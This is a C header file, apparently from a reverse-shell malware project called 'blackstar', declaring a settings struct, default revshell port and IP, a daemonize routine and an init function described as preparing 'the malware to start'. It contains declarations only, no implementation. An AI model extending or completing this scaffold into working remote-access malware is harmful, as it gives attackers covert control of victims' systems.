
#ifndef SETUP_H
#define SETUP_H

#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdbool.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

/// REVSHELL DEFAULT PORT
#define DEFAULT_PORT ("42069")

/// REVSHELL DEFAULT IP
#define DEFAULT_IP ("0.0.0.0")

/**
  * \typedef struct bs_setting_s settings_t
  * \brief object holding user defined settings
  *
  * \param sockfd socket communicating with server
  * \param logfd file descriptor handling log file
  * \param target_ip user-defined IP address
  * \param target_port user-defined PORT
  */
typedef struct bs_setting_s {
    int sockfd;
    int logfd;
    char *target_ip;
    char *target_port;
} settings_t;

/// DEFAULT LOGFILE PATH
#define LOG_PATH ("/tmp/blackstar.log")

/// Simple macro to log an error then exit code
#define KILL(x) { fprintf(stderr, "%s\n\n", x); exit(1); }

// setup.c

/**
  * \fn void daemonize(void)
  * \brief transforms the process into a deamon
  */
void daemonize(void);

/**
  * \fn void init(settings_t *s)
  * \brief set ups and build the necessary data for the malware to start
  *
  * \params s user-defined settings
  */
void init(settings_t *);

/**
  * \fn void flush(settings_t s)
  * \brief destroys user-defined data
  *
  * \param s user-defined settings
  */
void flush(settings_t);

/**
  * \fn void __log(char const *msg, settings_t s)
  * \brief logs a message to log file and socket
  *
  * \param msg message to log
  * \param s user-defined settings
  */
void __log(char const *, settings_t);

/**
  * \fn void parse_settings(int ac, char * const *av, settings_t *s)
  * \brief parses arguments and build user defined data if any
  *
  * \param ac nb of arguments
  * \param av array of arguments
  * \param s address of settings objects
  */
void parse_settings(int, char * const *, settings_t *);

#endif // SETUP_H
